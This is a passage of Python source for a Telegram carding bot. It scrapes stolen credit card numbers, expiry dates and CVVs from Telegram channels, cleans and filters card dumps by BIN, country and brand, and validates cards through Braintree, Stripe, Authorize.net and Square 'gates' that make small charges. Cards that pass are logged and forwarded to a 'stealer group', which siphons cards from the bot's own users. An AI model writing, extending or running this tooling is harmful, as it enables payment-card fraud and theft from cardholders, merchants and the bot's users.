        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

@require_approval
async def tempmail_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check temp mail inbox"""
    import asyncio
    user = update.effective_user
    
    token = tempmail_user_tokens.get(user.id)
    email = tempmail_user_emails.get(user.id, "your temp mail")
    
    if not token:
        await update.message.reply_text(
            "❌ <b>No temp mail found!</b>\n\n"
            "Generate one first with /tmail",
            parse_mode=ParseMode.HTML
        )
        return
    
    loading_msg = await update.message.reply_text(f"📥 Checking inbox for {email}...")
    
    try:
        loop = asyncio.get_running_loop()
        messages = await loop.run_in_executor(None, tempmail_list_messages, token)
        
        if not messages:
            await loading_msg.edit_text("📭 No messages in inbox (or invalid token)")
            return
        
        output = "📧 <b>Your Inbox</b>\n━━━━━━━━━━━━━━━━━━\n\n"
        
        for idx, msg in enumerate(messages[:10], 1):
            from_addr = msg.get('from', {}).get('address', 'Unknown')
            subject = msg.get('subject', 'No Subject')[:50]
            msg_id = msg.get('id', '')
            output += f"<b>{idx}.</b> From: <code>{from_addr}</code>\n"
            output += f"   Subject: {subject}\n"
            output += f"   📖 /rmail_{msg_id[:20]}\n\n"
        
        output += "━━━━━━━━━━━━━━━━━━\nClick /rmail_[id] to read message"
        try: await loading_msg.delete()
        except Exception: pass
        await _reply_with_gif(update.message, "welcome", output)
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

@require_approval
async def tempmail_read(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Read a specific temp mail message"""
    import asyncio
    user = update.effective_user
    
    token = tempmail_user_tokens.get(user.id)
    if not token:
        await update.message.reply_text(ae("❌ No temp mail found. Generate one with /tmail first."))
        return
    
    msg_text = update.message.text
    if msg_text.startswith('/rmail_'):
        msg_id = msg_text[7:].strip()
    elif context.args:
        msg_id = context.args[0]
    else:
        await update.message.reply_text(ae("❌ Usage: /rmail_[message_id]"))
        return
    
    loading_msg = await update.message.reply_text("📖 Loading message...")
    
    try:
        loop = asyncio.get_running_loop()
        
        messages = await loop.run_in_executor(None, tempmail_list_messages, token)
        full_msg_id = None
        for m in messages:
            if m.get('id', '').startswith(msg_id):
                full_msg_id = m.get('id')
                break
        
        if not full_msg_id:
            await loading_msg.edit_text(ae("❌ Message not found."))
            return
        
        details = await loop.run_in_executor(None, tempmail_get_message, token, full_msg_id)
        
        if not details:
            await loading_msg.edit_text(ae("❌ Failed to load message."))
            return
        
        from_addr = details.get('from', {}).get('address', 'Unknown')
        subject = details.get('subject', 'No Subject')
        
        if 'html' in details and details['html']:
            content = await loop.run_in_executor(None, tempmail_html_to_text, details['html'])
        elif 'text' in details:
            content = details['text']
        else:
            content = "Content not available."
        
        if len(content) > 3500:
            content = content[:3500] + "... [truncated]"
        
        output = f"""📧 <b>Email Details</b>
━━━━━━━━━━━━━━━━━━

📤 <b>From:</b> <code>{from_addr}</code>
📋 <b>Subject:</b> {subject}

━━━━━━━━━━━━━━━━━━

{content}"""
        
        try: await loading_msg.delete()
        except Exception: pass
        await _reply_with_gif(update.message, "welcome", output)
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

# ============================================================================
# WEBSITE ANALYZER - GATEWAY DETECTION & SECURITY ANALYSIS
# ============================================================================

@require_approval
async def web_analyzer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Analyze website for payment gateways and security features"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔍 <b>Website Analyzer</b>\n\n"
            "Analyze any website for payment gateways and security.\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/web example.com</code>\n\n"
            "💡 <b>Example:</b>\n"
            "<code>/web amazon.com</code>\n"
            "<code>/web shopify.com</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = context.args[0].strip()
    
    url = url.replace('https://', '').replace('http://', '').split('/')[0]
    
    if not url or '.' not in url:
        await update.message.reply_text(ae("❌ Invalid URL! Use format: /web example.com"))
        return
    
    status_msg = await update.message.reply_text(ae(f"🔍 Analyzing <code>{url}</code>..."), parse_mode=ParseMode.HTML)
    
    try:
        from modules.web_analyzer import analyze_website
        
        loop = asyncio.get_running_loop()
        result = await asyncio.wait_for(
            loop.run_in_executor(None, analyze_website, url, user.username or user.first_name, user.id),
            timeout=30.0
        )
        
        try: await status_msg.delete()
        except Exception: pass
        await _reply_with_gif(update.message, "welcome", result)
        
    except asyncio.TimeoutError:
        await status_msg.edit_text(ae("❌ Timeout! Website took too long to respond."))
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ Error: {str(e)[:100]}"))

# ============================================================================
# CC SCRAPER - SCRAPE CARDS FROM TELEGRAM CHANNELS (Web Preview)
# ============================================================================

import re as re_module
CC_PATTERN = re_module.compile(r'\b(\d{13,19})[|/\s](\d{1,2})[|/\s](\d{2,4})[|/\s](\d{3,4})\b')
CC_PATTERN_ALT = re_module.compile(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b')

def extract_ccs_from_text(text):
    """Extract credit cards from text"""
    cards = set()
    for match in CC_PATTERN.finditer(text):
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[-2:]
        if len(mm) == 1:
            mm = f"0{mm}"
        card = f"{cc}|{mm}|{yy}|{cvv}"
        if 13 <= len(cc) <= 19 and 1 <= int(mm) <= 12:
            cards.add(card)
    
    for match in CC_PATTERN_ALT.finditer(text):
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[-2:]
        if len(mm) == 1:
            mm = f"0{mm}"
        card = f"{cc}|{mm}|{yy}|{cvv}"
        if 13 <= len(cc) <= 19 and 1 <= int(mm) <= 12:
            cards.add(card)
    
    return list(cards)

@require_approval
async def cc_scraper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Scrape CCs from Telegram channel via web preview - /scr <channel> [amount]"""
    import asyncio
    user = update.effective_user
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ <b>Usage:</b> <code>/scr channel_username [amount]</code>\n\n"
            "📋 <b>Examples:</b>\n"
            "<code>/scr ccshop</code>\n"
            "<code>/scr ccshop 500</code>\n\n"
            "💡 Default: 100 messages, Max: 1000\n"
            "⚠️ Only channels with public preview enabled work",
            parse_mode=ParseMode.HTML
        )
        return
    
    channel = context.args[0].lstrip('@')
    amount = 100
    if len(context.args) > 1:
        try:
            amount = min(int(context.args[1]), 1000)
        except:
            amount = 100
    
    loading_msg = await update.message.reply_text(ae(f"🔄 Scraping @{channel}...\n📊 Target: {amount} messages"))
    
    try:
        loop = asyncio.get_running_loop()
        
        def scrape_channel_web():
            """Web preview scraping with pagination"""
            import requests
            from bs4 import BeautifulSoup
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
            
            all_cards = []
            total_messages = 0
            before_id = None
            pages_scraped = 0
            max_pages = (amount // 20) + 1
            
            while total_messages < amount and pages_scraped < max_pages:
                if before_id:
                    url = f"https://t.me/s/{channel}?before={before_id}"
                else:
                    url = f"https://t.me/s/{channel}"
                
                try:
                    response = requests.get(url, headers=headers, timeout=30)
                    if response.status_code != 200:
                        if pages_scraped == 0:
                            return None, 0, f"Channel not accessible (Status: {response.status_code})"
                        break
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    messages = soup.find_all('div', class_='tgme_widget_message')
                    
                    if not messages:
                        if pages_scraped == 0:
                            page_desc = soup.find('div', class_='tgme_page_description')
                            desc = page_desc.get_text()[:100] if page_desc else ""
                            return None, 0, f"No public preview for @{channel}.\nThis channel doesn't allow web preview."
                        break
                    
                    for msg in messages:
                        text_elem = msg.find('div', class_='tgme_widget_message_text')
                        if text_elem:
                            text = text_elem.get_text()
                            cards = extract_ccs_from_text(text)
                            all_cards.extend(cards)
                        total_messages += 1
                    
                    first_msg = messages[0]
                    data_post = first_msg.get('data-post', '')
                    if '/' in data_post:
                        msg_id = data_post.split('/')[-1]
                        before_id = int(msg_id)
                    else:
                        break
                    
                    pages_scraped += 1
                    
                except Exception as e:
                    if pages_scraped == 0:
                        return None, 0, f"Error: {str(e)[:100]}"
                    break
            
            unique_cards = list(set(all_cards))
            return unique_cards, total_messages, None
        
        cards, msg_count, error = await loop.run_in_executor(None, scrape_channel_web)
        
        if error:
            await loading_msg.edit_text(ae(f"❌ {error}"), parse_mode=ParseMode.HTML)
            return
        
        if not cards:
            await loading_msg.edit_text(
                f"📭 <b>No cards found in @{channel}</b>\n\n"
                f"📊 Messages checked: {msg_count}\n"
                f"⚙️ Method: {method}",
                parse_mode=ParseMode.HTML
            )
            return
        
        if len(cards) <= 30:
            cards_text = "\n".join([f"<code>{c}</code>" for c in cards])
            message = f"""✅ <b>CC Scraper Results</b>
━━━━━━━━━━━━━━━━━━

📢 <b>Channel:</b> @{channel}
📊 <b>Messages:</b> {msg_count}
🃏 <b>Cards Found:</b> {len(cards)}
⚙️ <b>Method:</b> {method}

━━━━━━━━━━━━━━━━━━

{cards_text}

━━━━━━━━━━━━━━━━━━
𝗦𝗰𝗿𝗮𝗽𝗲𝗱 𝗯𝘆 @{user.username or user.first_name}"""
            await loading_msg.edit_text(message, parse_mode=ParseMode.HTML)
        else:
            file_content = "\n".join(cards)
            from io import BytesIO
            file = BytesIO(file_content.encode('utf-8'))
            file.name = f"scraped_{channel}_{len(cards)}.txt"
            
            await loading_msg.delete()
            await update.message.reply_document(
                document=file,
                caption=ae(f"✅ <b>Scraped {len(cards)} cards from @{channel}</b>\n"
                        f"📊 Messages: {msg_count} | Method: {method}\n\n"
                        f"𝗦𝗰𝗿𝗮𝗽𝗲𝗱 𝗯𝘆 @{user.username or user.first_name}"),
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

# ============================================================================
# CC CLEANER - EXTRACT & FILTER CARDS FROM JUNK
# ============================================================================

@require_approval
async def clean_cc_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Clean, extract, and optionally filter cards from an uploaded .txt file.

    Usage:
      /clean                           → extract & clean all cards
      /clean bin:414740,52             → only keep BINs starting with given prefixes
      /clean country:US,GB             → only keep cards issued in given countries
      /clean bin:414740 country:US     → combine both filters
    """
    from io import BytesIO as _BytesIO
    user = update.effective_user

    # ── Parse optional args (bin:... country:...) ─────────────────────────────
    bin_prefixes  = []
    country_codes = []
    if context.args:
        for arg in context.args:
            if arg.lower().startswith("bin:"):
                bin_prefixes = [x.strip() for x in arg[4:].split(",") if x.strip()]
            elif arg.lower().startswith("country:"):
                country_codes = [x.strip().upper() for x in arg[8:].split(",") if x.strip()]

    # ── Require an attached document ─────────────────────────────────────────
    if not update.message.document:
        sep = "────────────────────────"
        help_text = ae(
            f"🧹 <b>ONICHAN • CC CLEANER</b>\n\n"
            f"{sep}\n\n"
            f"📎 Attach a <b>.txt file</b> with messy card data and send\n"
            f"   the <code>/clean</code> command as the caption.\n\n"
            f"{sep}\n\n"
            f"📝 <b>Optional filters:</b>\n"
            f"<code>/clean bin:414740,52</code>     — filter by BIN prefix\n"
            f"<code>/clean country:US,GB</code>     — filter by country\n"
            f"<code>/clean bin:414740 country:US</code>\n\n"
            f"💡 <b>Supported input formats:</b>\n"
            f"<code>CC|MM|YY|CVV</code>  <code>CC|MM|YYYY|CVV</code>\n"
            f"<code>CC:MM:YY:CVV</code>  <code>CC/MM/YY/CVV</code>\n"
            f"<code>CC MM YY CVV</code>  (space-separated)\n"
            f"(CVV optional, expired cards auto-removed)"
        )
        await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)
        return

    document = update.message.document
    if not (document.file_name or "").endswith('.txt'):
        await update.message.reply_text(ae("❌ Only <b>.txt</b> files are supported!"), parse_mode=ParseMode.HTML)
        return

    loading_msg = await update.message.reply_text("🧹 Cleaning and extracting cards…")

    try:
        # Download file content
        tg_file      = await context.bot.get_file(document.file_id)
        file_bytes_r = await tg_file.download_as_bytearray()
        text_content = bytes(file_bytes_r).decode('utf-8', errors='ignore')

        # ── Extract ───────────────────────────────────────────────────────────
        raw_cards    = extract_cards_from_junk(text_content, remove_expired=True)
        after_dedup  = remove_duplicates(raw_cards)
        dupes_count  = len(raw_cards) - len(after_dedup)

        if not raw_cards:
            await loading_msg.edit_text(ae(
                "❌ <b>No valid cards found!</b>\n\n"
                "The file doesn't contain any recognisable card formats.\n\n"
                "💡 Supported: <code>CC|MM|YY|CVV</code> and variants."
            ), parse_mode=ParseMode.HTML)
            return

        # ── Apply optional filters ────────────────────────────────────────────
        filtered = after_dedup
        if bin_prefixes:
            filtered = filter_by_bin(filtered, bin_prefixes)
        if country_codes:
            filtered = filter_by_country(filtered, country_codes)

        sorted_cards = sort_cards(filtered, by='brand')
        stats        = get_statistics(sorted_cards)

        # ── Active filter summary ─────────────────────────────────────────────
        filter_info = ""
        if bin_prefixes:
            filter_info += f"🔍 <b>BIN filter</b>   : <code>{', '.join(bin_prefixes)}</code>\n"
        if country_codes:
            filter_info += f"🌍 <b>Country filter</b>: <code>{', '.join(country_codes)}</code>\n"

        sep = "────────────────────────"

        # ── Build stats message ───────────────────────────────────────────────
        stats_text = (
            f"🧹 <b>ONICHAN • CC CLEANER</b>\n\n"
            f"{sep}\n\n"
            f"📄 <b>File</b>        : <code>{document.file_name}</code>\n"
            f"📥 <b>Extracted</b>   : <code>{len(raw_cards)}</code>\n"
            f"✅ <b>Unique</b>      : <code>{len(after_dedup)}</code>\n"
            f"🗑️ <b>Duplicates</b>  : <code>{dupes_count}</code>\n"
        )
        if filter_info:
            stats_text += f"\n{filter_info}"
            stats_text += f"📊 <b>After filter</b> : <code>{len(sorted_cards)}</code>\n"

        stats_text += f"\n{sep}\n\n💳 <b>By Brand:</b>\n"
        for brand, cnt in sorted(stats['by_brand'].items(), key=lambda x: -x[1]):
            stats_text += f"• {brand}: <code>{cnt}</code> cards\n"
        stats_text += f"\n🔢 <b>Unique BINs</b>  : <code>{stats['unique_bins']}</code>\n"

        if not sorted_cards:
            stats_text += f"\n\n⚠️ <i>No cards matched your filters.</i>"
            await loading_msg.edit_text(ae(stats_text), parse_mode=ParseMode.HTML)
            return

        # ── Inline preview (first 10 cards) ──────────────────────────────────
        preview_lines = ""
        preview_count = min(10, len(sorted_cards))
        for i, card in enumerate(sorted_cards[:preview_count], 1):
            preview_lines += f"{i}. <code>{card['card']}</code> <i>[{card['brand']}]</i>\n"
        if len(sorted_cards) > 10:
            preview_lines += f"<i>… and {len(sorted_cards) - 10} more (see attached file)</i>\n"

        stats_text += f"\n{sep}\n\n💳 <b>Cleaned Cards:</b>\n\n{preview_lines}"
        stats_text += (
            f"\n{sep}\n\n"
            f"👤 <b>Cleaned by</b> : @{user.username or user.first_name}"
        )

        await loading_msg.edit_text(ae(stats_text), parse_mode=ParseMode.HTML)

        # ── Always send full .txt file ────────────────────────────────────────
        cleaned_content = "\n".join(card['card'] for card in sorted_cards)
        fname           = f"Onichan_Clean_By_{user.id}_{len(sorted_cards)}.txt"
        out_bytes       = _BytesIO(cleaned_content.encode('utf-8'))
        out_bytes.name  = fname

        filter_caption = ""
        if bin_prefixes:
            filter_caption += f"  BIN: {', '.join(bin_prefixes)}\n"
        if country_codes:
            filter_caption += f"  Country: {', '.join(country_codes)}\n"

        caption = ae(
            f"📁 <b>Cleaned Cards</b>\n"
            f"{sep}\n"
            f"📊 <b>Total</b>   : <code>{len(sorted_cards)}</code> cards\n"
            + (f"🔍 <b>Filters</b> :\n{filter_caption}" if filter_caption else "")
            + f"👤 <b>By</b>     : @{user.username or user.first_name}"
        )

        await update.message.reply_document(
            document=out_bytes,
            filename=fname,
            caption=caption,
            parse_mode=ParseMode.HTML,
        )

    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

@require_approval
async def filter_cc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Filter cards by brand from uploaded file"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/filter VISA</code> (then upload file)\n"
            "<code>/filter MASTERCARD</code>\n"
            "<code>/filter AMEX</code>\n\n"
            "💡 <b>Supported brands:</b>\n"
            "VISA, MASTERCARD, AMEX, DISCOVER, JCB, DINERS",
            parse_mode=ParseMode.HTML
        )
        return
    
    brand_filter = context.args[0].upper()
    
    # Store filter in user context
    context.user_data['cc_filter'] = brand_filter
    
    await update.message.reply_text(
        f"✅ <b>Filter set to: {brand_filter}</b>\n\n"
        f"📁 Now upload a .txt file with cards!\n\n"
        f"The bot will extract only {brand_filter} cards.",
        parse_mode=ParseMode.HTML
    )

@require_approval
async def handle_filter_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file upload for filtering"""
    user = update.effective_user
    
    # Check if filter is set
    if 'cc_filter' not in context.user_data:
        return  # Not a filter operation
    
    brand_filter = context.user_data['cc_filter']
    
    # Check if message has document
    if not update.message.document:
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(ae("❌ Only .txt files are supported!"))
        return
    
    loading_msg = await update.message.reply_text(ae(f"🔍 Filtering {brand_filter} cards..."))
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        text_content = file_content.decode('utf-8', errors='ignore')
        
        # Extract and filter cards
        raw_cards = extract_cards_from_junk(text_content)
        formatted_cards = clean_and_format_cards(raw_cards)
        unique_cards = remove_duplicates(formatted_cards)
        filtered_cards = filter_by_brand(unique_cards, [brand_filter])
        
        if not filtered_cards:
            await loading_msg.edit_text(
                f"❌ <b>No {brand_filter} cards found!</b>\n\n"
                f"Found {len(unique_cards)} total cards, but none are {brand_filter}.",
                parse_mode=ParseMode.HTML
            )
            # Clear filter
            del context.user_data['cc_filter']
            return
        
        # Create result
        sep = "━━━━━━━━━━━━━━━━━━━━"
        result_text = f"""💜 <b>ONICHAN • FILTER {brand_filter}</b>
{sep}
📄 <b>File</b>    : {document.file_name}
📊 <b>Total</b>   : {len(unique_cards)}
✅ <b>{brand_filter}</b> : {len(filtered_cards)}
{sep}
"""
        
        for i, card in enumerate(filtered_cards[:20], 1):
            result_text += f"{i}. <code>{card['card']}</code>\n"
        
        if len(filtered_cards) > 20:
            result_text += f"\n<i>...and {len(filtered_cards) - 20} more cards</i>\n"
        
        result_text += f"""
━━━━━━━━━━━━━━━━━━━━━━

👤 <b>Filtered by:</b> @{user.username or user.first_name}"""
        
        await loading_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        
        # Send full list if more than 20
        if len(filtered_cards) > 20:
            cleaned_content = "\n".join([card['card'] for card in filtered_cards])
            cleaned_filename = f"{brand_filter}_{document.file_name}"
            
            from io import BytesIO
            file_bytes = BytesIO(cleaned_content.encode('utf-8'))
            file_bytes.name = cleaned_filename
            
            await update.message.reply_document(
                document=file_bytes,
                filename=cleaned_filename,
                caption=f"📁 <b>{brand_filter} cards ({len(filtered_cards)} total)</b>",
                parse_mode=ParseMode.HTML
            )
        
        # Clear filter
        del context.user_data['cc_filter']
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))
        if 'cc_filter' in context.user_data:
            del context.user_data['cc_filter']

# ============================================================================
# GATE CHECKING COMMANDS
# ============================================================================

def parse_card(text):
    """Parse card details from text - supports multiple formats"""
    # Remove command
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        return None
    
    card_data = parts[1].replace(" ", "").replace(":", "|").replace("/", "|")
    card_parts = card_data.split("|")
    
    cc = mm = yy = cvv = None
    
    if len(card_parts) >= 4:
        # Format: CC|MM|YY|CVV (standard)
        cc = card_parts[0][:16]
        mm = card_parts[1].zfill(2)
        yy = card_parts[2][-2:]
        cvv = card_parts[3][:4]
    elif len(card_parts) == 3:
        # Format: CC|MMYY|CVV or CC|YYYY|CVV (combined date)
        cc = card_parts[0][:16]
        date_part = card_parts[1]
        cvv = card_parts[2][:4]
        
        if len(date_part) == 4:
            # Could be MMYY or YYYY
            mm = date_part[:2]
            yy = date_part[2:]
        elif len(date_part) == 2:
            # Just YY, assume current month
            import datetime
            mm = str(datetime.datetime.now().month).zfill(2)
            yy = date_part
        else:
            return None
    else:
        return None
    
    # Validate all parts are digits
    if not all(p and p.isdigit() for p in [cc, mm, yy, cvv]):
        return None
    
    # Validate lengths
    if not (len(cc) >= 15 and len(mm) == 2 and len(yy) == 2 and len(cvv) >= 3):
        return None
    
    return cc, mm, yy, cvv

def extract_cards_from_text(text):
    """Extract all valid card combos from text - supports multiple formats"""
    import re
    
    cards = []
    
    # Pattern 1: CC|MM|YY|CVV (4 parts)
    pattern_4part = r'(\d{15,16})[|:/\s]+(\d{1,2})[|:/\s]+(\d{2,4})[|:/\s]+(\d{3,4})'
    
    # Pattern 2: CC|MMYY|CVV (3 parts with combined date)
    pattern_3part = r'(\d{15,16})[|:/\s]+(\d{4})[|:/\s]+(\d{3,4})'
    
    # Try 4-part pattern first
    matches = re.findall(pattern_4part, text)
    for match in matches:
        cc = match[0][:16]
        mm = match[1].zfill(2)
        yy = match[2][-2:]
        cvv = match[3][:4]
        
        if (cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit() and
            len(cc) >= 15 and len(mm) == 2 and len(yy) == 2 and len(cvv) >= 3):
            cards.append((cc, mm, yy, cvv))
    
    # Try 3-part pattern for any remaining cards
    matches_3 = re.findall(pattern_3part, text)
    for match in matches_3:
        cc = match[0][:16]
        date_part = match[1]
        cvv = match[2][:4]
        
        mm = date_part[:2]
        yy = date_part[2:]
        
        card_tuple = (cc, mm, yy, cvv)
        if card_tuple not in cards:  # Avoid duplicates
            if (cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit() and
                len(cc) >= 15 and len(mm) == 2 and len(yy) == 2 and len(cvv) >= 3):
                cards.append(card_tuple)
    
    return cards

async def get_txt_content_from_reply(update, context) -> str:
    """Return decoded text content if the replied-to message contains a .txt file, else empty string."""
    msg = update.message
    if not (msg and msg.reply_to_message):
        return ""
    reply = msg.reply_to_message
    if reply.document and reply.document.file_name and reply.document.file_name.lower().endswith(".txt"):
        try:
            loading_msg = await msg.reply_text("📁 <b>Loading cards from file...</b>", parse_mode=ParseMode.HTML)
            context.user_data['_txt_loading_msg'] = loading_msg
            file = await context.bot.get_file(reply.document.file_id)
            content = await file.download_as_bytearray()
            return content.decode("utf-8", errors="ignore")
        except Exception:
            context.user_data.pop('_txt_loading_msg', None)
    return ""


async def _get_or_edit_loading_msg(context, update, text, parse_mode=ParseMode.HTML):
    """Edit the txt-file loading message if present, otherwise send a new reply. Returns the message object."""
    loading_msg = context.user_data.pop('_txt_loading_msg', None)
    if loading_msg:
        try:
            await loading_msg.edit_text(text, parse_mode=parse_mode)
            return loading_msg
        except Exception:
            pass
    return await update.message.reply_text(text, parse_mode=parse_mode)

def get_mass_check_limit(user_id):
    """Get mass check limit for user"""
    if is_owner(user_id):
        return MASS_CHECK_LIMITS["owner"]
    elif is_premium(user_id):
        return MASS_CHECK_LIMITS["premium"]
    else:
        return MASS_CHECK_LIMITS["free"]

def _build_gate_response(cc, mm, yy, cvv, status_str, message, gate_display, bin_info, elapsed, username, proxy_str="None"):
    """Build unified Onichan gate response for inline gate handlers"""
    from modules.gate_checker import _onichan_format, _clean_response_msg
    result = {"status": "success", "message": message}
    return ae(_onichan_format(result, cc, mm, yy, cvv, bin_info, gate_display, elapsed, username))

async def check_gate(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_name: str, gate_display: str, require_prem: bool = False):
    """Generic gate checker"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline(gate_name):
        await update.message.reply_text(offline_message(gate_name), parse_mode=ParseMode.HTML)
        return
    user = update.effective_user

    # Check if banned
    if is_banned(user.id):
        gif_url = get_sexy_anime_gif("banned")
        await update.message.reply_animation(
            animation=gif_url,
            caption=ae("🚫 <b>YOU ARE BANNED!</b>\n\nYou cannot use this bot."),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if approved
    if not is_approved(user.id):
        await update.message.reply_text(
            "⏳ <b>Access Pending</b>\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval.\n\n"
            f"Contact: @{SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check premium requirement
    if require_prem and not is_premium(user.id):
        gif_url = get_sexy_anime_gif("premium")
        await update.message.reply_animation(
            animation=gif_url,
            caption=get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Parse card
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/{gate_name} 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    # Send initial checking message
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: {gate_display}",
        parse_mode=ParseMode.HTML
    )
    
    # Animate checking progress
    import asyncio
    import time as time_module
    animations = [
        "⬜⬜⬜⬜⬜",
        "🟦⬜⬜⬜⬜",
        "🟦🟦⬜⬜⬜",
        "🟦🟦🟦⬜⬜",
        "🟦🟦🟦🟦⬜",
        "🟦🟦🟦🟦🟦"
    ]
    
    for i, anim in enumerate(animations):
        try:
            await checking_msg.edit_text(
                f"🎀 <b>Checking card...</b> {anim}\n\n"
                f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                f"Gateway: {gate_display}",
                parse_mode=ParseMode.HTML
            )
            await asyncio.sleep(0.3)
        except:
            pass
    
    # Check card using PHP gate (run in thread pool to avoid blocking event loop)
    start_time = time_module.time()
    result = await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)
    elapsed = time_module.time() - start_time
    
    # Format response
    response = ae(format_gate_response(result, gate_name, cc, mm, yy, cvv, user.username or user.first_name, elapsed))
    
    # Log approved cards and notify owner
    card_is_approved = False
    
    if result["status"] == "success":
        msg_lower = result["message"].lower()
        card_is_approved = "approved" in msg_lower or "success" in msg_lower or "valid" in msg_lower or "authorized" in msg_lower
        
        if card_is_approved:
            from modules.gate_checker import get_bin_info
            bin_info = get_bin_info(cc)
            
            # Log approved cards
            log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, gate_name, result["message"], bin_info)
            
            # Send to stealer group
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, gate_name, result["message"], bin_info, user.id, user.username or user.first_name)
            
            # Send result WITH GIF attached (not separate)
            try:
                success_gif = get_sexy_anime_gif("success")
                await update.message.reply_animation(
                    animation=success_gif,
                    caption=response,  # Full result attached to GIF
                    parse_mode=ParseMode.HTML
                )
                # Delete checking message
                try:
                    await checking_msg.delete()
                except:
                    pass
            except Exception:
                # Fallback: try without HTML parsing if there's an issue
                try:
                    import re
                    plain_response = re.sub(r'<[^>]+>', '', response)
                    await checking_msg.edit_text(plain_response)
                except:
                    await checking_msg.edit_text("Card checked - check result above")
            

        else:
            # Send result WITH declined GIF attached (not separate)
            try:
                failed_gif = get_sexy_anime_gif("failed")
                await update.message.reply_animation(
                    animation=failed_gif,
                    caption=response,  # Full result attached to GIF
                    parse_mode=ParseMode.HTML
                )
                # Delete checking message
                try:
                    await checking_msg.delete()
                except:
                    pass
            except Exception:
                # Fallback: try without HTML parsing if there's an issue
                try:
                    import re
                    plain_response = re.sub(r'<[^>]+>', '', response)
                    await checking_msg.edit_text(plain_response)
                except:
                    await checking_msg.edit_text("Card checked - see result")

# FREE GATES
@require_approval
async def gate_bu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree Auth $1"""
    await check_gate(update, context, "bu", "Braintree Auth $1", False)

@require_approval
async def gate_sq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Square Auth $0"""
    await check_gate(update, context, "sq", "Square Auth $0", False)

# PREMIUM GATES - PayPal (old ref, overridden below)
# gate_pp is defined later with the new PayPal $1 async checker

# PREMIUM GATES - Stripe
@require_premium
async def gate_sor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe $2"""
    await check_gate(update, context, "sor", "Stripe $2", True)

@require_premium
async def gate_st5(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe $5"""
    await check_gate(update, context, "st5", "Stripe $5", True)

@require_premium
async def gate_st12(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe $12"""
    await check_gate(update, context, "st12", "Stripe $12", True)

@require_premium
async def gate_dep(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe $49"""
    await check_gate(update, context, "dep", "Stripe $49", True)

# PREMIUM GATES - Authorize.net
@require_premium
async def gate_auz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorize.net $0"""
    await check_gate(update, context, "auz", "Authorize.net $0", True)

@require_premium
async def gate_asd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorize.net $7"""
    await check_gate(update, context, "asd", "Authorize.net $7", True)

@require_premium
async def gate_atf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorize.net $25"""
    await check_gate(update, context, "atf", "Authorize.net $25", True)

@require_premium
async def gate_anh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorize.net $200"""
    await check_gate(update, context, "anh", "Authorize.net $200", True)

# PREMIUM GATES - Shopify
@require_premium
async def gate_sh6(update: Update, context: ContextTypes.DEFAULT_TYPE):
